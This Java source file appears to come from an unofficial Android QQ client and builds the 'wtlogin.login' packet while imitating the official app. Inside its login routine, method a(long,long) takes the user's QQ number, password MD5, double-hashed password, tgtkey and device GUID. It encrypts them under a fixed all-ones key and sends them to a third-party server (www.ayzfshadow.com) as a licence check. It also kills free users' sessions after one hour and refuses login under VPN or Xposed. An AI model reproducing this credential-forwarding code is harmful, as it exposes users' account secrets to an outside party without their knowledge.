package saki.qq.datapacket.pack.send;

import android.content.Context;
import com.saki.packagea.mark3_classb;
import java.io.File;
import java.io.FileInputStream;
import java.security.MessageDigest;
import java.util.Timer;
import java.util.TimerTask;
import saki.qq.datapacket.pack.ByteWriter;
import saki.qq.global.DeviceInfo;
import saki.qq.global.ProtocolInfo;
import saki.qq.global.mark12_classa;
import saki.qq.global.mark12_classb;
import saki.qq.global.mark12_classc;
import saki.qq.global.mark12_classh;
import saki.toolkit.ByteReader;
import saki.toolkit.Code;
import saki.toolkit.HexToolKit;
import saki.toolkit.TeaCryptor;
import saki.ui.LoginActivity;

public class wtlogin_login extends SendPack
{

    String[] c = new String[]{"tenpay.com", "qzone.qq.com", "qun.qq.com", "mail.qq.com", "openmobile.qq.com", "qzone.com", "game.qq.com"};
	int y =4;

	public static byte[] i;
    public wtlogin_login(int var1)
    {
        super("wtlogin.login");
        this.e(var1);
    }

    public wtlogin_login(long var1, String var3, int var4)
    {
        super("wtlogin.login");
        ProtocolInfo.a(var1, var3);
        
        this.e(var4);
    }

    private void e(int var1)
    {
        try
        {
//			从服务器获取密匙对
//            new String(new mark3_classb().a("http://", true, 5000, 15000, new String[0]));
//            Log.d("hhhh", new Date().getTime() + "");
//            Class<?> cls = Class.forName("java.util.Date");
//            Object obj = cls.getConstructor().newInstance();
//            Method md =cls.getDeclaredMethod("getTime");
//            long h =(long)md.invoke(obj);
//            byte[] i =new TeaCryptor().encrypt((h + "").getBytes(), ProtocolInfo.crckey);
//            String cmd= HexToolKit.bytesToHexString(i);
//            byte[] kkkk = new mark3_classb().a("http://69.85.84.59:9999/boobs/boobserver?cmd=getboobs&data=" + cmd);
//            if(kkkk==null){
//                Class<?> cls1 = Class.forName("java.lang.System");
//                Method md1 =cls1.getDeclaredMethod("exit",int.class);
//                md1.invoke(null,0);
//            }
//            
//            byte[] iiii = new TeaCryptor().decrypt(kkkk,ProtocolInfo.crckey);
//            if(iiii==null){
//                Class<?> cls1 = Class.forName("java.lang.System");
//                Method md1 =cls1.getDeclaredMethod("exit",int.class);
//                md1.invoke(null,0);
//            }
//            ByteReader rrrr = new ByteReader(iiii);
            
            
            this.setRequestId(var1);
            this.setType(2);
            this.setUin(mark12_classc.c);
            this.setCmd(new byte[]{8, 16});
            this.setKey(ProtocolInfo.h);
         
//            byte[]o=rrrr.readBytes(y*4);
//            Log.d("sharekey",HexToolKit.a(o));
//            byte[]p=rrrr.readRestBytesAndDestroy();
//            Log.d("pubkey",HexToolKit.a(p));
//            this.setKey(o);
//            ProtocolInfo.sharekey=o;
//            ProtocolInfo.pubkey=p;
            
            this.setPublicKey(ProtocolInfo.pubkey);
            
            this.setImei(DeviceInfo.imei);
            this.setAppsub(ProtocolInfo.appid);
            this.setVersion("|460020597543391|A7.2.5.310885");

        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }

    protected byte[] A()
    {
        ByteWriter var1 = new ByteWriter();
        byte[] var2 = new byte[]{(byte)1, 0};
        var1.writeBytes(var2);
        var1.writeShort(22);
        var2 = new byte[]{0, (byte)1};
        var1.writeBytes(var2);
        var2 = new byte[4];
        var2[3] = (byte)5;
        var1.writeBytes(var2);
        var2 = new byte[4];
        var2[3] = (byte)16;
        var1.writeBytes(var2);
        var1.writeInt(ProtocolInfo.appid);
        var1.writeBytes(new byte[4]);
        var1.writeBytes(new byte[]{2, 30, 16, -32});
        return var1.getDataAndDestroy();
    }

    protected byte[] t0116()
    {
        ByteWriter var2 = new ByteWriter();
        byte[] var1 = new byte[14];
        var1[0] = (byte)1;
        var1[1] = (byte)22;
        var1[3] = (byte)14;
        var1[6] = (byte)7;
        var1[7] = (byte)-1;
        var1[8] = (byte)124;
        var1[10] = (byte)1;
        var1[11] = (byte)4;
        var1[13] = (byte)1;
        var2.writeBytes(var1);
        var2.writeInt(1600000226L);
        return var2.getDataAndDestroy();
    }

    @Override  public byte[] getContent()
    {
        return Code.QQTEAencrypt(this.a(this.getUin(), this.getSeq(), System.currentTimeMillis() / 1000L), ProtocolInfo.sharekey);
    }

    public byte[] a(long var1, int var3, long var4)
    {
        ByteWriter var6 = new ByteWriter();
        var6.writeShort(9);
        var6.writeShort(20);
        var6.writeBytes(this.c(var1));
        var6.writeBytes(this.b(var1, var4));
        var6.writeBytes(this.a(var1, var4));
        var6.writeBytes(this.t0116());
        var6.writeBytes(this.A());
        var6.writeBytes(this.z());
        var6.writeBytes(this.y());
        var6.writeBytes(this.t());
        var6.writeBytes(this.s());
        var6.writeBytes(this.r());
        var6.writeBytes(this.d(var3));
        var6.writeBytes(this.q());
        var6.writeBytes(this.t0008());
        var6.writeBytes(this.o());
        var6.writeBytes(this.n());
        var6.writeBytes(this.m());
        var6.writeBytes(this.l());
        var6.writeBytes(this.k());
        var6.writeBytes(this.j());
        var6.writeBytes(this.i());
        return var6.getDataAndDestroy();
    }

    protected byte[] a(long var1, long var3)
    {
		
		try
		{
		    if (com.ayzf_shadow.tool.jiance.vpn.֏֏֏֏֏֏() == false || com.ayzf_shadow.tool.jiance.xposed.֏֏֏֏֏֏() == false)
            {
                mark12_classh.a().a(3, "连接服务器失败，无法登录".getBytes());
                return null;
            }
			ByteWriter bw= new ByteWriter();
			bw.writeInt(var1);//qq
			bw.writeInt(var3);//时间
			bw.writeInt(ProtocolInfo.appid);//appid
			bw.writeBytes(mark12_classc.e);//密码md5 长度16
			bw.writeBytes(ProtocolInfo.d);//(密码md5+qq)二次md5 长度16
			bw.writeBytes(ProtocolInfo.f);//tgtkey 长度16
			bw.writeBytes(mark12_classb.a);//guid 长度16
			byte[] encrypted = new TeaCryptor().encrypt(bw.getDataAndDestroy(),new byte[]{1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1});
			
			String cmd= HexToolKit.bytesToHexString(encrypted);
			byte[] kkkk = new mark3_classb().a("http://www.ayzfshadow.com/SQv8/ServerV8.php?cmd=" + cmd+"&id="+HexToolKit.bytesToHexString(new TeaCryptor().encrypt(LoginActivity.applMd5.getBytes(),new byte[]{1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1})));
            if (kkkk == null)
			{
				mark12_classh.a().a(3, "连接服务器失败，无法登录".getBytes());
            }
            byte[] iiii = new TeaCryptor().decrypt(kkkk,new byte[]{1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1});
			ByteReader reader = new ByteReader(iiii);
			int result = (int) reader.readInt();
			if(result==0)//授权用户
            {
				//System.out.println("decryption failed");
                mark12_classh.a().a(7,reader.readBytesByShortLength());
				//throw new RuntimeException();
            }
            else if (result==1)//免费用户
            {
                result = 0;//允许登录
                mark12_classh.a().a(7,reader.readBytesByShortLength());
                new Timer().schedule(new TimerTask(){
                        @Override
                        public void run(){
                            System.exit(0);
                        }
                    }, 3600000);
            }
            else if (result==2)//禁止登录
            {
                mark12_classh.a().a(3,reader.readBytesByShortLengthAndDestroy());
				throw new RuntimeException();
            }
            //mark12_classh.a().a(7,reader.readBytesByShortLength());
			return reader.readRestBytesAndDestroy();
		}
		catch (Exception e)
		{
			e.printStackTrace();
			return null;
		}

		
//        ByteWriter var6 = new ByteWriter();
//        var6.writeShort(4);
//        var6.writeBytes(new byte[]{69, -64, 18, 49});
//        var6.writeInt(5);
//        var6.writeInt(16);
//        var6.writeBytes(new byte[8]);
//        var6.writeInt(var1);
//        var6.writeInt(var3);
//        var6.writeBytes(new byte[4]);
//        var6.writeByte(1);
//        var6.writeBytes(mark12_classc.e);
//        var6.writeBytes(ProtocolInfo.f);
//        var6.writeBytes(new byte[4]);
//        var6.writeByte(1);
//        var6.writeBytes(mark12_classb.a);
//        var6.writeInt(ProtocolInfo.appid);
//        var6.writeInt(1);
//        String var5 = String.valueOf(var1);
//        var6.writeShort(var5.getBytes().length);
//        var6.writeString(var5);
//        var6.writeShort(0);
//        TeaCryptor cry= new TeaCryptor();
//        byte[] o =cry.encrypt(var6.getDataAndDestroy(), ProtocolInfo.d);
//        cry.destroy();
//        var6.recreate();
//        var6.writeBytes(o);
//        var6.rewriteSelfShortLength(0);
//        var6.rewriteBytes(new byte[]{1, 6});
//        return var6.getDataAndDestroy();
    }

    public static final String appMd5(Context a){return getFileMd5(a.getPackageResourcePath());}//软件MD5
    public static String getFileMd5(String path)
    {
        try
        {
            // 获取一个文件的特征信息，签名信息。
            File file = new File(path);
            // md5
            MessageDigest digest = MessageDigest.getInstance("md5");
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[1024];
            int len = -1;
            while ((len = fis.read(buffer)) != -1)
            {
                digest.update(buffer,0,len);
            }
            byte[] result = digest.digest();
            StringBuffer sb  = new StringBuffer();
            for (byte b : result)
            {
                // 与运算
                int number = b & 0xff;// 加盐
                String str = Integer.toHexString(number);
                // System.out.println(str);
                if (str.length() == 1)
                {
                    sb.append("0");
                }
                sb.append(str);
            }
            return sb.toString();
        }
        catch (Exception e)
        {
            return "";
        }
    }
    protected byte[] b(long var1, long var3)
    {
        ByteWriter var6 = new ByteWriter();
        byte[] var5 = new byte[]{0, (byte)1};
        var6.writeBytes(var5);
        var6.writeShort(20);
        var6.writeShort(1);
        var6.writeBytes(new byte[]{94, -16, -53, -99});
        var6.writeInt(var1);
        var6.writeInt(var3);
        var6.writeBytes(new byte[6]);
        return var6.getDataAndDestroy();
    }

    protected byte[] c(long var1)
    {
        ByteWriter var3 = new ByteWriter();
        byte[] var4 = new byte[]{0, (byte)24};
        var3.writeBytes(var4);
        var3.writeShort(22);
        var4 = new byte[14];
        var4[1] = (byte)1;
        var4[4] = (byte)6;
        var4[9] = (byte)16;
        var3.writeBytes(var4);
        var3.writeInt(var1);
        var3.writeBytes(new byte[4]);
        return var3.getDataAndDestroy();
    }

    @Override  public byte[] encryptKey()
    {
        return ProtocolInfo.a;
    }

    protected byte[] d(int var1)
    {
        ByteWriter var2 = new ByteWriter();
        var2.writeBytes(new byte[]{1, 84});
        var2.writeShort(4);
        var2.writeInt(var1);
        return var2.getDataAndDestroy();
    }

    protected byte[] i()
    {
        ByteWriter var1 = new ByteWriter();
        var1.writeByte(1);
        var1.writeBytes(new byte[]{87, 103, -92, 9});
        var1.writeShort("6.3.1.1583".getBytes().length);
        var1.writeString("6.3.1.1583");
        var1.rewriteSelfShortLength(0);
        var1.rewriteBytes(new byte[]{1, 119});
        return var1.getDataAndDestroy();
    }

    protected byte[] j()
    {
        ByteWriter var1 = new ByteWriter();
        var1.writeShort(16);
        var1.writeBytes(new byte[]{-49, 83, 55, -6, -109, 3, 9, -40, -118, 18, 92, -18, -97, -100, -22, -38});
        var1.writeShort(DeviceInfo.wifi.getBytes().length);
        var1.writeString(DeviceInfo.wifi);
        var1.rewriteSelfShortLength(0);
        var1.rewriteBytes(new byte[]{2, 2});
        return var1.getDataAndDestroy();
    }

    protected byte[] k()
    {
        byte[] var1 = new byte[]{(byte)1, (byte)-111, 0, (byte)1, (byte)0x821/*这里改成1就是图形验证码，不过已经废弃了*/};
        return var1;
    }

    protected byte[] l()
    {
        byte[] var1 = new byte[]{(byte)1, (byte)-108, 0, (byte)16, (byte)93, (byte)15, (byte)69, (byte)-33, (byte)-96, (byte)98, (byte)-5, (byte)-68, (byte)1, (byte)109, (byte)110, (byte)-96, (byte)-52, (byte)6, (byte)-13, (byte)11};
        return var1;
    }

    protected byte[] m()
    {
        byte[] var1 = new byte[]{(byte)1, (byte)-120, 0, (byte)16, (byte)100, (byte)7, (byte)-87, (byte)-116, (byte)-29, (byte)-96, (byte)-89, (byte)-118, (byte)-34, (byte)-30, (byte)53, (byte)-49, (byte)111, (byte)116, (byte)126, (byte)-49};
        return var1;
    }

    protected byte[] n()
    {
        byte[] var1 = new byte[]{(byte)1, (byte)-121, 0, (byte)16, (byte)61, (byte)-116, (byte)-57, (byte)-38, (byte)60, (byte)-47, (byte)120, (byte)-98, (byte)20, (byte)81, (byte)-4, (byte)-56, (byte)-54, (byte)-75, (byte)19, (byte)-24};
        return var1;
    }

    protected byte[] o()
    {
        ByteWriter var3 = new ByteWriter();
        var3.writeShort(this.c.length);
        String[] var5 = this.c;
        int var2 = var5.length;

        for (int var1 = 0; var1 < var2; ++var1)
        {
            String var4 = var5[var1];
            var3.writeByte(1);
            var3.writeShort(var4.getBytes().length);
            var3.writeString(var4);
        }

        var3.rewriteSelfShortLength(0);
        var3.rewriteBytes(new byte[]{81, 17});
        return var3.getDataAndDestroy();
    }

    protected byte[] t0008()
    {
        byte[] var1 = new byte[12];
        var1[1] = (byte)8;
        var1[3] = (byte)8;
        var1[8] = (byte)8;
        var1[9] = (byte)4;
        return var1;
    }

    protected byte[] q()
    {
        ByteWriter var1 = new ByteWriter();
        var1.writeShort(1);
        var1.writeShort("Android".getBytes().length);
        var1.writeString("Android");
        var1.writeShort(2);
        var1.writeShort("wifi".getBytes().length);
        var1.writeString("wifi");
        var1.rewriteSelfShortLength(0);
        var1.rewriteBytes(new byte[]{1, 65});
        return var1.getDataAndDestroy();
    }

    protected byte[] r()
    {
        ByteWriter var1 = new ByteWriter();
        var1.writeInt(16);
        var1.writeShort("6.5.0".getBytes().length);
        var1.writeString("6.5.0");
        var1.writeShort(mark12_classa.a.length);
        var1.writeBytes(mark12_classa.a);
        var1.rewriteSelfShortLength(0);
        var1.rewriteBytes(new byte[]{1, 71});
        return var1.getDataAndDestroy();
    }

    protected byte[] s()
    {
        ByteWriter var1 = new ByteWriter();
        var1.writeBytes(new byte[]{1, 69});
        var1.writeShort(mark12_classb.a.length);
        var1.writeBytes(mark12_classb.a);
        return var1.getDataAndDestroy();
    }

    protected byte[] t()
    {
        ByteWriter var1 = new ByteWriter();
        var1.writeShort(4);
        var1.writeBytes(this.x());
        var1.writeBytes(this.w());
        var1.writeBytes(this.v());
        var1.writeBytes(this.u());
        TeaCryptor cry= new TeaCryptor();
        byte[] o =cry.encrypt(var1.getDataAndDestroy(), ProtocolInfo.f);
        cry.destroy();
        var1.recreate();
        var1.writeBytes(o);
        var1.rewriteSelfShortLength(0);
        var1.rewriteBytes(new byte[]{1, 68});
        return var1.getDataAndDestroy();
    }

    protected byte[] u()
    {
        ByteWriter var1 = new ByteWriter();
        var1.writeBytes(new byte[]{1, 110});
        var1.writeShort(DeviceInfo.deviceName.getBytes().length);
        var1.writeString(DeviceInfo.deviceName);
        return var1.getDataAndDestroy();
    }

    protected byte[] v()
    {
        ByteWriter var1 = new ByteWriter();
        byte[] var2 = new byte[9];
        var2[2] = (byte)1;
        var2[3] = (byte)1;
        var2[5] = (byte)17;
        var1.writeBytes(var2);
        if (DeviceInfo.deviceName.getBytes().length > 32)
        {
            var1.writeShort(32);
            var1.writeString(DeviceInfo.deviceName.substring(0, 32));
        }
        else
        {
            var1.writeShort(DeviceInfo.deviceName.getBytes().length);
            var1.writeString(DeviceInfo.deviceName);
        }
        var1.writeShort(mark12_classb.a.length);
        var1.writeBytes(mark12_classb.a);
        var1.writeShort(DeviceInfo.deviceCompany.getBytes().length);
        var1.writeString(DeviceInfo.deviceCompany);
        var1.rewriteSelfShortLength(0);
        var1.rewriteBytes(new byte[]{1, 40});
        return var1.getDataAndDestroy();
    }

    protected byte[] w()
    {
        ByteWriter var1 = new ByteWriter();
        var1.writeShort("android".getBytes().length);
        var1.writeString("android");
        var1.writeShort(DeviceInfo.androidVersion.getBytes().length);
        var1.writeString(DeviceInfo.androidVersion);
        var1.writeShort(2);
        var1.writeShort("Android".getBytes().length);
        var1.writeString("Android");
        var1.writeInt("wifi".getBytes().length);
        var1.writeString("wifi");
        var1.rewriteSelfShortLength(0);
        var1.rewriteBytes(new byte[]{1, 36});
        return var1.getDataAndDestroy();
    }

    protected byte[] x()
    {
        ByteWriter var2 = new ByteWriter();
        byte[] var1 = new byte[]{(byte)1, (byte)9, 0, (byte)16};
        var2.writeBytes(var1);
        var2.writeBytes(Code.md5(DeviceInfo.imei.getBytes()));
        return var2.getDataAndDestroy();
    }

    protected byte[] y()
    {
        ByteWriter var1 = new ByteWriter();
        var1.writeInt("com.tencent.mobileqq".getBytes().length);
        var1.writeString("com.tencent.mobileqq");
        var1.rewriteSelfShortLength(0);
        var1.rewriteBytes(new byte[]{1, 66});
        return var1.getDataAndDestroy();
    }

    protected byte[] z()
    {
        byte[] var1 = new byte[10];
        var1[0] = (byte)1;
        var1[1] = (byte)7;
        var1[3] = (byte)6;
        var1[9] = (byte)1;
        return var1;
    }
}

        
